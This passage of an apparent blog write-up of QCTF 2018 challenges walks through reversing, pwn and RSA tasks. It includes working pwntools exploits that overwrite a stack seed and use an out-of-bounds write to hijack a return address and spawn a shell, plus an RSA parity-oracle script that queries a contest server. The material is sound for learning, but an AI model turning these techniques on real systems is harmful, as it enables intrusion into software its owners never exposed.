  v7 = __readfsqword(0x28u);
  fd = open(that_girl, 0, girl, that_girl);
  while ( read(fd, &amp;buf, 1uLL) == 1 )
  {
    v2 = convert(buf);
    ++*(_DWORD *)&amp;v4[4 * v2];
  }
  return close(fd);
}
</code></pre>
<p><code>convert()</code> 函数中是一个对读入的 buf 的映射，不用刻意看具体是什么操作，后面直接打表就完事了：</p>
<pre><code class="cpp">__int64 __fastcall convert(char buf)
{
  __int64 result; // rax

  result = (unsigned int)(buf - 10);
  switch ( buf )
  {
    case &#39;\n&#39;:
      result = (unsigned int)(buf + 35);
      break;
    case &#39; &#39;:
    case &#39;!&#39;:
    case &#39;&quot;&#39;:
      result = (unsigned int)(buf + 10);
      break;
    case &#39;\&#39;&#39;:
      result = (unsigned int)(buf + 2);
      break;
    case &#39;,&#39;:
      result = (unsigned int)(buf - 4);
      break;
    case &#39;.&#39;:
      result = (unsigned int)(buf - 7);
      break;
    case &#39;:&#39;:
    case &#39;;&#39;:
      result = (unsigned int)(buf - 21);
      break;
    case &#39;?&#39;:
      result = (unsigned int)(buf - 27);
      break;
    case &#39;_&#39;:
      result = (unsigned int)(buf - 49);
      break;
    default:
      if ( buf &lt;= &#39;/&#39; || buf &gt; &#39;9&#39; )
      {
        if ( buf &lt;= &#39;@&#39; || buf &gt; &#39;Z&#39; )
        {
          if ( buf &gt; &#39;`&#39; &amp;&amp; buf &lt;= &#39;z&#39; )
            result = (unsigned int)(buf - 87);  // lower case
        }
        else
        {
          result = (unsigned int)(buf - 55);    // upper case
        }
      }
      else
      {
        result = (unsigned int)(buf - 48);      // number
      }
      break;
  }
  return result;
}
</code></pre>
<p>最后是对 flag 的加密部分：</p>
<pre><code class="cpp">unsigned __int64 __fastcall encrypt(const char *input, char *girl)
{
  int i; // [rsp+18h] [rbp-48h]
  int len; // [rsp+1Ch] [rbp-44h]
  char enc[56]; // [rsp+20h] [rbp-40h]
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  len = strlen(input);
  for ( i = 0; i &lt; len; ++i )
    enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])];
  index_round(enc);
  shift(enc, len);
  output(enc, &quot;out&quot;, len);
  return __readfsqword(0x28u) ^ v6;
}
</code></pre>
<p>这里用到了一个 global 的 table，和之前的词频一样，通过打表将映射关系记录下来：</p>
<pre><code class="c">__int64 __fastcall index_round(char *enc)
{
  __int64 result; // rax
  _BYTE v2[5]; // [rsp+13h] [rbp-5h]

  v2[4] = 0;                                    // v2[1] = 0;
  *(_DWORD *)v2 = (unsigned __int8)*enc;
  while ( table[*(signed int *)&amp;v2[1]] )
  {
    enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]];
    *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]];
  }
  result = v2[0];
  enc[*(signed int *)&amp;v2[1]] = v2[0];
  return result;
}
</code></pre>
<p><code>shift()</code> 做了一个循环位移，这个操作显然是可逆的：</p>
<pre><code class="cpp">char *__fastcall shift(char *enc, int len)
{
  char *result; // rax
  char v3; // [rsp+17h] [rbp-5h]
  int i; // [rsp+18h] [rbp-4h]

  v3 = (unsigned __int8)*enc &gt;&gt; 5;
  for ( i = 0; len - 1 &gt; i; ++i )
    enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] &gt;&gt; 5);
  result = &amp;enc[i];
  *result = 8 * *result | v3;
  return result;
}
</code></pre>
<p><code>output()</code> 函数将密文输出到 <code>out</code> 中：</p>
<pre><code class="cpp">int __fastcall output(char *enc, const char *file, int len)
{
  int v4; // [rsp+Ch] [rbp-24h]
  int i; // [rsp+28h] [rbp-8h]
  int fd; // [rsp+2Ch] [rbp-4h]

  v4 = len;
  fd = open(file, 65, 438LL);
  for ( i = 0; i &lt; v4; ++i )
    write(fd, &amp;enc[i], 1uLL);
  return close(fd);
}
</code></pre>
<p>总体加密过程统计了 that_girl 文件的词频, 并将 flag 转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本：</p>
<pre><code class="python">#!/usr/bin/env python
f = open(&#39;out&#39;, &#39;rb&#39;)
t = f.read()
f.close()
enc = []
for i in range(len(t)):
    enc.append(ord(t[i]))
print enc
flag = &#39;&#39;

def convert(c):
    res = c - 10
    if c == 10:
        res = c + 35
    elif 32 &lt;= c &lt;= 34:
        res = c + 10
    elif c == 39:
        res = c + 2
    elif c == 44:
        res = c - 4
    elif c == 46:
        res = c - 7
    elif 58 &lt;= c &lt;= 59:
        res = c - 21
    elif c == 63:
        res = c - 27
    elif c == 95:
        res = c - 49
    else:
        if c &lt;= 47 or c &gt; 57:
            if c &lt;= 64 or c &gt; 90:
                if c &gt; 96 and c &lt;= 122:
                    res = c - 87
            else:
                res = c - 55
        else:
            res = c - 48
    return res

# convert1
convert_map = {}
for ch in range(256):
    convert_map[convert(ch)] = ch
# print convert_map

f = open(&#39;that_girl&#39;, &#39;rb&#39;)
that_girl = f.read()
f.close()
# print that_girl

girl = [0 for i in range(256)]
for i in range(len(that_girl)):
    t = convert(that_girl[i])
    girl[t * 4] += 1
# print girl

# shift
enc1 = []
enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))
for i in range(len(enc) - 1):
    enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))
print len(enc1)

table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]
print len(table)

# convert2
round_map = {}
x = 0
while table[x] != 0:
    round_map[table[x]] = x
    x = table[x]
round_map[0] = 1
print round_map

enc2 = [0 for i in range(len(enc1))]
for origin, encoded in round_map.items():
    enc2[origin] = enc1[encoded]

for i in range(len(enc2)):
    for j in range(len(girl) / 4):
        if enc2[i] == girl[j * 4]:
            flag += chr(convert_map[j])
            break

print &#39;flag: QCTF{%s}&#39; % flag
</code></pre>
<h2 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h2><p>题目给的 binary 很大，各种混淆，硬逆太困难了。<code>pintool</code> 走一波，这里推荐一个脚本 <a href="https://github.com/ChrisTheCoolHut/PinCTF" target="_blank" rel="noopener">pinCTF</a>（大概跑了一个半小时的样子）。</p>
<pre><code class="bash">root@fea7928d5398:~/PinCTF# ./pinCTF.py -f ./ollvm -a -l obj-intel64/ -sl 38 -r abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_+={} -sk
[~] Status:
threading : False
reverseRange : False
skipFavoredPaths : True
[~] Trying {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 0 using Q for QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying Q{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 1 using C for QCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QC{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 2 using T for QCTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCT{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 3 using F for QCTFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 4 using { for QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 5 using 5 for QCTF{5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 6 using Y for QCTF{5YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Y{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 7 using m for QCTF{5YmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym{AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 8 using 4 for QCTF{5Ym4AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4{AAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 9 using a for QCTF{5Ym4aAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4a{AAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 10 using O for QCTF{5Ym4aOAAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aO{AAAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 11 using E for QCTF{5Ym4aOEAAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOE{AAAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 12 using w for QCTF{5Ym4aOEwAAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEw{AAAAAAAAAAAAAAAAAAAAAAAA
[+] iter 13 using w for QCTF{5Ym4aOEwwAAAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww{AAAAAAAAAAAAAAAAAAAAAAA
[+] iter 14 using 2 for QCTF{5Ym4aOEww2AAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2{AAAAAAAAAAAAAAAAAAAAAA
[+] iter 15 using N for QCTF{5Ym4aOEww2NAAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2N{AAAAAAAAAAAAAAAAAAAAA
[+] iter 16 using c for QCTF{5Ym4aOEww2NcAAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2Nc{AAAAAAAAAAAAAAAAAAAA
[+] iter 17 using Z for QCTF{5Ym4aOEww2NcZAAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZ{AAAAAAAAAAAAAAAAAAA
[+] iter 18 using c for QCTF{5Ym4aOEww2NcZcAAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZc{AAAAAAAAAAAAAAAAAA
[+] iter 19 using v for QCTF{5Ym4aOEww2NcZcvAAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcv{AAAAAAAAAAAAAAAAA
[+] iter 20 using U for QCTF{5Ym4aOEww2NcZcvUAAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvU{AAAAAAAAAAAAAAAA
[+] iter 21 using P for QCTF{5Ym4aOEww2NcZcvUPAAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUP{AAAAAAAAAAAAAAA
[+] iter 22 using O for QCTF{5Ym4aOEww2NcZcvUPOAAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPO{AAAAAAAAAAAAAA
[+] iter 23 using W for QCTF{5Ym4aOEww2NcZcvUPOWAAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOW{AAAAAAAAAAAAA
[+] iter 24 using K for QCTF{5Ym4aOEww2NcZcvUPOWKAAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWK{AAAAAAAAAAAA
[+] iter 25 using Y for QCTF{5Ym4aOEww2NcZcvUPOWKYAAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKY{AAAAAAAAAAA
[+] iter 26 using M for QCTF{5Ym4aOEww2NcZcvUPOWKYMAAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYM{AAAAAAAAAA
[+] iter 27 using n for QCTF{5Ym4aOEww2NcZcvUPOWKYMnAAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMn{AAAAAAAAA
[+] iter 28 using P for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPAAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnP{AAAAAAAA
[+] iter 29 using a for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaAAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPa{AAAAAAA
[+] iter 30 using q for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqAAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaq{AAAAAA
[+] iter 31 using P for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPAAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqP{AAAAA
[+] iter 32 using y for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPyAAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPy{AAAA
[+] iter 33 using w for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywAAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPyw{AAA
[+] iter 34 using R for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywRAAA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR{AA
[+] iter 35 using 2 for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2AA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2{A
[+] iter 36 using m for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2mA
[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m{
[+] iter 37 using } for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m}
[+] Found pattern QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m}
</code></pre>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Xman-dice-game"><a href="#Xman-dice-game" class="headerlink" title="Xman-dice_game"></a>Xman-dice_game</h2><p>放进 ida 看 main 函数：</p>
<p><img src="/pics/2018-QCTF/15.png" srcset="/img/loading.gif" alt></p>
<p>buf 存在溢出，可以覆盖到 seed，使之为 0。想法就是通过爆破得到随机数的顺序。脚本：</p>
<pre><code class="python">from pwn import *
import random
import time
def test(ans):
    p = process(&#39;./dice_game&#39;)
    # p = remote(&quot;47.96.239.28&quot;, 9999)
    p.readuntil(&quot;name:&quot;)
    payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0)
    p.sendline(payload)
    i = 0
    ans_len = len(ans)
    log.success(ans)
    if True:
        while i &lt; ans_len:
            p.readuntil(&quot;nt(1~6): &quot;)
            n = ans[i]
            i += 1
            p.sendline(n)
        random.seed(time.time())
        n = str(int(random.randint(1, 6)))
        p.readuntil(&quot;nt(1~6): &quot;)
        p.sendline(n)
        print(n)
        sub = p.readuntil(&#39;.&#39;)
        log.info(sub)
        return sub, n

ans = &quot;&quot;
while(1):
    if len(ans) == 50:
        print(ans)
        break
    res, n = test(ans)
    if &quot;win&quot; in res:
        ans += n
</code></pre>
<p>通过得到的顺序作为 payload，脚本：</p>
<pre><code class="python">from pwn import *
p = process(&#39;./dice_game&#39;)
# p = remote(&quot;47.96.239.28&quot;, 9999)
p.readuntil(&quot;name:&quot;)
payload = p64(0x1122334455667788) * 8 + p64(0)
p.sendline(payload)
ans = &quot;25426251423232651155634433322261116425254446323361&quot;
i = 0
while i &lt; 50:
    p.readuntil(&quot;nt(1~6): &quot;)
    n = ans[i]
    i += 1
    p.sendline(n)
p.interactive()
</code></pre>
<p><img src="/pics/2018-QCTF/16.png" srcset="/img/loading.gif" alt></p>
<h2 id="Xan-stack2"><a href="#Xan-stack2" class="headerlink" title="Xan-stack2"></a>Xan-stack2</h2><p>感觉这应该算是一道比较好的栈溢出的题。<code>checksec</code> 发现 PIE 没开，Canary 和 NX 都开了。</p>
<p><img src="/pics/2018-QCTF/17.png" srcset="/img/loading.gif" alt></p>
<p>拖进 ida 后 f5：</p>
<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [esp+18h] [ebp-90h]
  unsigned int v6; // [esp+1Ch] [ebp-8Ch]
  int v7; // [esp+20h] [ebp-88h]
  unsigned int j; // [esp+24h] [ebp-84h]
  int v9; // [esp+28h] [ebp-80h]
  unsigned int i; // [esp+2Ch] [ebp-7Ch]
  unsigned int k; // [esp+30h] [ebp-78h]
  unsigned int l; // [esp+34h] [ebp-74h]
  char v13[100]; // [esp+38h] [ebp-70h]
  unsigned int v14; // [esp+9Ch] [ebp-Ch]

  v14 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  v9 = 0;
  puts(&quot;***********************************************************&quot;);
  puts(&quot;*                      An easy calc                       *&quot;);
  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);
  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);
  puts(&quot;***********************************************************&quot;);
  puts(&quot;How many numbers you have:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v5);
  puts(&quot;Give me your numbers&quot;);
  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )
  {
    __isoc99_scanf(&quot;%d&quot;, &amp;v7);
    v13[i] = v7;
  }
  for ( j = v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 / (double)j)) )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);
          __isoc99_scanf(&quot;%d&quot;, &amp;v6);
          if ( v6 != 2 )
            break;
          puts(&quot;Give me your number&quot;);
          __isoc99_scanf(&quot;%d&quot;, &amp;v7);
          if ( j &lt;= 0x63 )
          {
            v3 = j++;
            v13[v3] = v7;
          }
        }
        if ( v6 &gt; 2 )
          break;
        if ( v6 != 1 )
          return 0;
        puts(&quot;id\t\tnumber&quot;);
        for ( k = 0; k &lt; j; ++k )
          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);
      }
      if ( v6 != 3 )
        break;
      puts(&quot;which number to change:&quot;);
      __isoc99_scanf(&quot;%d&quot;, &amp;v5);
      puts(&quot;new number:&quot;);
      __isoc99_scanf(&quot;%d&quot;, &amp;v7);
      v13[v5] = v7;
    }
    if ( v6 != 4 )
      break;
    v9 = 0;
    for ( l = 0; l &lt; j; ++l )
      v9 += v13[l];
  }
  return 0;
}
</code></pre>
<p>还能看到有一个<code>hackhere</code>函数，直接调用了<code>system(&quot;/bin/bash&quot;)</code>。</p>
<pre><code class="cpp">puts(&quot;which number to change:&quot;);
__isoc99_scanf(&quot;%d&quot;, &amp;v5);
puts(&quot;new number:&quot;);
__isoc99_scanf(&quot;%d&quot;, &amp;v7);
v13[v5] = v7; // index out of bound
</code></pre>
<p>这里发现 v5 和 v7 没有做任何检查，能达到任意地址写。</p>
<p>所以这题的思路就是将 <code>main</code> 函数 return 地址覆盖为 <code>hackhere</code> 的地址。</p>
<p><img src="/pics/2018-QCTF/18.png" srcset="/img/loading.gif" alt></p>
<p>基本就是 ret 到 hackhere 然后直接就成功了：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
import ctypes
p = process(&#39;./stack2&#39;)
context.log_level = &#39;debug&#39;

def change(index, content):
    p.sendlineafter(&#39;5. exit\n&#39;, &#39;3&#39;)
    p.sendlineafter(&#39;which number to change:\n&#39;, str(index))
    p.sendlineafter(&#39;new number:\n&#39;, str(content))

p.sendlineafter(&#39;How many numbers you have:\n&#39;, &#39;1&#39;)
p.sendlineafter(&#39;Give me your numbers\n&#39;, &#39;1&#39;)
hack_addr = 0x0804859b
offset = 132
# gdb.attach(p, &#39;b *0x0804859b&#39;)
for i in range(4):
    byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff
    byte = str(ctypes.c_int8(byte))
    start = byte.find(&#39;(&#39;) + 1
    end = byte.find(&#39;)&#39;)
    byte = int(byte[start:end])
    change(offset + i, byte)
p.sendlineafter(&#39;5. exit\n&#39;, &#39;5&#39;)
p.interactive()
</code></pre>
<p>但发现远程没有 bash，所以想到直接用字符串中的 sh，即 <code>system(&amp;&quot;/bin/bash&quot;[7])</code>，只需要找到字符串在栈上的位置：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
import ctypes
p = process(&#39;./stack2&#39;)
context.log_level = &#39;debug&#39;

def change(index, content):
    p.sendlineafter(&#39;5. exit\n&#39;, &#39;3&#39;)
    p.sendlineafter(&#39;which number to change:\n&#39;, str(index))
    p.sendlineafter(&#39;new number:\n&#39;, str(content))

p.sendlineafter(&#39;How many numbers you have:\n&#39;, &#39;1&#39;)
p.sendlineafter(&#39;Give me your numbers\n&#39;, &#39;1&#39;)
hack_addr = 0x0804859b
sys_addr = 0x08048450
offset = 132
# gdb.attach(p, &#39;b *0x0804859b&#39;)
# overflow ret
for i in range(4):
    byte = (sys_addr &gt;&gt; (i * 8)) &amp; 0xff
    byte = str(ctypes.c_int8(byte))
    start = byte.find(&#39;(&#39;) + 1
    end = byte.find(&#39;)&#39;)
    byte = int(byte[start:end])
    change(offset + i, byte)
str_addr = 0x08048987
offset2 = offset + 8
# point to string &#39;sh&#39;
for i in range(4):
    byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff
    byte = str(ctypes.c_int8(byte))
    start = byte.find(&#39;(&#39;) + 1
    end = byte.find(&#39;)&#39;)
    byte = int(byte[start:end])
    change(offset2 + i, byte)
p.sendlineafter(&#39;5. exit\n&#39;, &#39;5&#39;)
p.interactive()
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>题目信息如下：</p>
<pre><code class="rsa">e = 0x10001

n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db

c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0
</code></pre>
<p><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">最低有效位攻击</a>了解一下。</p>
<p>对密文乘 <code>2^e(mod n)</code> 操作，再解密的时候，如果为偶数，说明明文在 <code>(0, n/2)</code> 之间，否则在 <code>(n/2, n)</code> 之间。这样，只需要 log<sub>2</sub>n 次就可以知道明文：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *

e = 0x10001
n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db
c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0

upper = n
lower = 0
k = 1
while True:
    r = remote(&#39;111.198.29.45&#39;, 33136)
    r.recvuntil(&#39;now\n&#39;)
    pat = (pow(pow(2, k, n), e, n) * c) % n
    new_c = hex(pat)[2:].strip(&#39;L&#39;)
    r.sendline(new_c)
    data = r.recvline()[:-1]
    r.close()
    gap = upper - lower
    if data == &#39;even&#39;:
        info(&#39;Round {}: even&#39;.format(str(k)))
        upper = (upper + lower) / 2
    if data == &#39;odd&#39;:
        info(&#39;Round {}: odd&#39;.format(str(k)))
        lower = (upper + lower) / 2
    if data == &#39;error&#39;:
        break
    if gap &lt; 2:
        break
    info(gap)
    k += 1

flag = &#39;{:x}&#39;.format(upper).decode(&#39;hex&#39;)[:-1] + &#39;}&#39;
print &#39;flag:&#39;, flag
</code></pre>
<h2 id="Xman-RSA"><a href="#Xman-RSA" class="headerlink" title="Xman-RSA"></a>Xman-RSA</h2><p>拿到四个文件后，其中有一个很像 python 的脚本，通过对关键字等的判断，自己写脚本还原：</p>
<pre><code class="python">l1 = {
    &#39;a&#39;: &#39;d&#39;,
    &#39;b&#39;: &#39;m&#39;,
    &#39;d&#39;: &#39;e&#39;,
    &#39;e&#39;: &#39;n&#39;,
    &#39;f&#39;: &#39;w&#39;,
    &#39;g&#39;: &#39;f&#39;,
    &#39;h&#39;: &#39;o&#39;,
    &#39;i&#39;: &#39;x&#39;,
    &#39;j&#39;: &#39;g&#39;,
    &#39;k&#39;: &#39;p&#39;,
    &#39;l&#39;: &#39;y&#39;,
    &#39;m&#39;: &#39;h&#39;,
    &#39;p&#39;: &#39;i&#39;,
    &#39;q&#39;: &#39;r&#39;,
    &#39;r&#39;: &#39;a&#39;,
    &#39;t&#39;: &#39;s&#39;,
    &#39;u&#39;: &#39;b&#39;,
    &#39;v&#39;: &#39;k&#39;,
    &#39;w&#39;: &#39;t&#39;,
    &#39;x&#39;: &#39;c&#39;,
    &#39;y&#39;: &#39;l&#39;,
    &#39;z&#39;: &#39;u&#39;
}
f = open(&#39;encryption.encrypted&#39;, &#39;r&#39;)
ans = f.read()
# print ans
res = &quot;&quot;
for ch in ans:
    flag = 0
    for key, value in l1.items():
        if ch == key:
            res += value
            flag = 1
            break
        else:
            continue
    if flag == 1:
        continue
    else:
        res += ch
print res
raw_input()
f = open(&#39;1.py&#39;, &#39;wb&#39;)
f.write(res)
f.close()
</code></pre>
<p>还原出原来的加密脚本：</p>
<pre><code class="python">from gmpy2 import is_prime
from os import urandom
import base64

def bytes_to_num(b):
    return int(b.encode(&#39;hex&#39;), 16)

def num_to_bytes(n):
    b = hex(n)[2:-1]
    b = &#39;0&#39; + b if len(b)%2 == 1 else b
    return b.decode(&#39;hex&#39;)

def get_a_prime(l):
    random_seed = urandom(l)

    num = bytes_to_num(random_seed)

    while True:
        if is_prime(num):
            break
        num+=1
    return num

def encrypt(s, e, n):
    p = bytes_to_num(s)
    p = pow(p, e, n)
    return num_to_bytes(p).encode(&#39;hex&#39;)

def separate(n):
    p = n % 4
    t = (p*p) % 4
    return t == 1

f = open(&#39;flag.txt&#39;, &#39;r&#39;)
flag = f.read()

msg1 = &quot;&quot;
msg2 = &quot;&quot;
for i in range(len(flag)):
    if separate(i): # 奇数
        msg2 += flag[i]
    else: # 偶数
        msg1 += flag[i]

p1 = get_a_prime(128)
p2 = get_a_prime(128)
p3 = get_a_prime(128)
n1 = p1*p2
n2 = p1*p3
e = 0x1001
c1 = encrypt(msg1, e, n1)
c2 = encrypt(msg2, e, n2)
print(c1)
print(c2)

e1 = 0x1001
e2 = 0x101
p4 = get_a_prime(128)
p5 = get_a_prime(128)
n3 = p4*p5
c1 = num_to_bytes(pow(n1, e1, n3)).encode(&#39;hex&#39;)
c2 = num_to_bytes(pow(n1, e2, n3)).encode(&#39;hex&#39;)
print(c1)
print(c2)

print(base64.b64encode(num_to_bytes(n2)))
print(base64.b64encode(num_to_bytes(n3)))
</code></pre>
